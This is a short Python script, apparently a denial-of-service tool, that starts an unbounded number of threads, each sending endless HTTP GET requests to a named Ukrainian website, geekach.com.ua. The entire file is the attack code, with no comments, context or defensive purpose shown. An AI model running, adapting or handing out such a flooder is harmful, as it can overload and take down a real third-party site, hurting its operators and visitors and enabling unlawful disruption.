# coding: utf8
import threading
import requests


def dos():
    while True:
        requests.get("https://geekach.com.ua/ru/")


while True:
    threading.Thread(target=dos).start()

